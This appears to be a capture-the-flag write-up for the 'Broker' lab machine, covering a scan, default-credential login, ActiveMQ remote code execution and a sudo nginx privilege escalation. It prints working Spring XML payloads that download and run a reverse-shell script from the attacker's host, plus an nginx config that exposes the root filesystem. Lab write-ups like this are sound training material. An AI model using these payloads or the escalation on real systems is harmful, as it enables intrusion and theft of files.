---
authors:
    - Jiri Raja
date: 08-10-2025
---
# Broker
Linux machine

## Foothold

Do not forget to update the `/etc/hosts` file.

### Nmap port scan

```shell
nmap -sV -v broker.htb
```

visit the website. It's asking for credentials. We will try `admin:admin`.

It works!

## User
The running service is ActiveMQ with a version 5.15.15.

We find an [exploit](https://github.com/X1r0z/ActiveMQ-RCE) (needs to be build first, install golang (`apt install golang; go build`)).

Get the [python reverse shells](https://github.com/infodox/python-pty-shells).

Tailor the payload files for the use (can be done in a single file using `sh -c command ...`):

```xml
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg >
            <list>
                <value>curl</value>
                <value>http://10.10.14.76:8001/tcp_pty_backconnect.py</value>
                <value>-o</value>
                <value>/tmp/asdasd.py</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

```xml
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg >
            <list>
                <value>python3</value>
                <value>/tmp/asdasd.py</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

execute the exploit (make sure the shell handler is running):
```shell
./ActiveMQ-RCE -i broker.htb -u http://10.10.14.76:8000/poc.xml
./ActiveMQ-RCE -i broker.htb -u http://10.10.14.76:8000/poc2.xml
```

Read the flag.

## Root
Check for sudo privileges:
```shell
sudo -l
```

We can run nginx as a root. We have to create a config to allow file listing:
```text
# Run nginx using:
#     nginx -p $PWD -e stderr -c nginx.conf
user root;
daemon off;  # run in foreground

events {}

pid nginx.pid;

http {
    access_log /dev/stdout;

    server {
        server_name   broker.htb;
        listen        0.0.0.0:8091;

        location / {
            root /;
            autoindex on;
        }
    }

}
```

run it:
```shell
sudo /usr/sbin/nginx -p . -c conf
```

access the website (http://broker.htb:8091) and read the flag.

